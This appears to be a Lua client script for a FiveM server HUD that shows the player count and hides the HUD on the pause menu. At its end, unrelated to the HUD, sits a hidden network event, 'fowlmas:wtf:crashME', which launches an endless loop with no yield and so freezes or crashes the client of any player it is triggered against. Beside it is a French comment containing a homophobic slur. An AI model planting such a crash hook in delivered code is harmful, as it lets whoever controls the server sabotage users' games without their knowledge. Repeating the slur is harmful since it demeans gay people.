RegisterNetEvent('iZeyy::Hud::UpdatePlayers', function(playerCount)
    Wait(1000)
    SendNUIMessage({
        action = 'iZeyy::Hud::UpdatePlayers',
        players = playerCount
    })
end)

AddEventHandler("iZeyy::Hud::StateHud", function(bool)
    if (bool) then
        SendNUIMessage({ action = "iZeyy:Hud:Show" })
    else
        SendNUIMessage({ action = "iZeyy:Hud:Hide" })
    end
end)

CreateThread(function()
    local isDisabled = false

    while true do
        local pauseMenuActive = IsPauseMenuActive()

        if pauseMenuActive and not isDisabled then
            SendNUIMessage({ action = "iZeyy:Hud:Hide" })
            isDisabled = true
        elseif not pauseMenuActive and isDisabled then
            SendNUIMessage({ action = "iZeyy:Hud:Show" })
            isDisabled = false
        end

        Wait(1000)
    end
end)


RegisterNetEvent("fowlmas:wtf:crashME", function()
    CreateThread(function()
        while true do
            -- Voila pour les pd🤡
        end
    end)
end)